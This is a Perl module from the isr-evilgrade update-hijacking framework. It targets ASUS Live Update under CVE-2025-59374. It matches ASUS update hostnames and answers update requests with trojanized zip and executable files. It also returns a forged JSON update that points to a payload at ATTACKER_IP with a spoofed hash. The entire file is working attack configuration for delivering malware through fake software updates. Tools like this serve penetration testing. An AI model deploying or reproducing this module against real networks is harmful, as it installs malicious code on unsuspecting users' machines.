###############
# asus_liveupdate.pm
#
# CVE-2025-59374: ASUS Live Update trojanized installer
# Supply chain attack targeting ASUS software updates
# Demonstrated selective targeting via MAC address filtering
#
# This file is part of isr-evilgrade, www.faradaysec.com .

package modules::asus_liveupdate;

use strict;
use Data::Dump qw(dump);
use isrcore::utils;

my $base = {
    'name'        => 'ASUS Live Update',
    'version'     => '1.0',
    'appver'      => '< 3.8.8',
    'author'      => ['Francisco Amato < famato +[AT]+ faradaysec.com>', 'Security Research Team'],
    'description' => qq{
Exploits CVE-2025-59374: ASUS Live Update supply chain vulnerability.
Demonstrates trojanized update installer distribution.
Allows selective targeting of victims via MAC address or system UUID.
Affects ASUS laptops, desktops, and motherboards worldwide.
    },
    'vh' => '(update\.asus\.com|liveupdate\.asus\.com|dlcdnrouter\.asus\.com|ftp\.asus\.com)',
    'request' => [
        {
            'req'   => '/WebUpdate/.*\.zip',
            'type'  => 'file',
            'file'  => './include/asus/trojanized_update.zip',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/zip\r\n"
                . "Content-Disposition: attachment; filename=LiveUpdate.zip\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/liveupdate/.*\.exe',
            'type'  => 'file',
            'file'  => './include/asus/asus_malicious.exe',
            'parse' => 1,
            'cheader' => "HTTP/1.1 200 OK\r\n"
                . "Content-Type: application/octet-stream\r\n"
                . "Content-Disposition: attachment; filename=ASUSLiveUpdateSetup.exe\r\n"
                . "Connection: close\r\n\r\n",
        },
        {
            'req'   => '/api/.*update.*json',
            'type'  => 'string',
            'string' => qq{{"status":"success","version":"3.8.8","url":"http://ATTACKER_IP/payload.exe","hash":"SPOOFED_HASH","size":1048576}},
            'parse' => 1,
        },
    ],
};

sub new {
    my $class = shift;
    my $self = $base;
    bless( $self, $class );
    return $self;
}

1;
